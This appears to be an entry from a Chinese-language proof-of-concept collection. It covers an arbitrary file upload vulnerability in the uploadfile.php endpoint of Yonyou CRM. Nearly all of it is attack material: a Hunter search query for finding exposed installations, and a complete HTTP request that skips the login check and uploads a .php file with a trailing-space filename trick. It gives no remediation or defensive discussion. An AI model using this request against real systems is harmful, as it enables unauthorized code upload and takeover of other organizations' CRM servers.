## 用友CRM系统uploadfile.php接口存在任意文件上传

## hunter

```yaml
app.name="用友 CRM"
```

## poc

```yaml
POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Connection: close
Content-Length: 358
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855

-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream

test123
-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="upload"

upload
-----------------------------269520967239406871642430066855--
```

![image](https://github.com/wy876/POC/assets/139549762/195b7dfb-918c-448c-b774-8d141f14a29e)
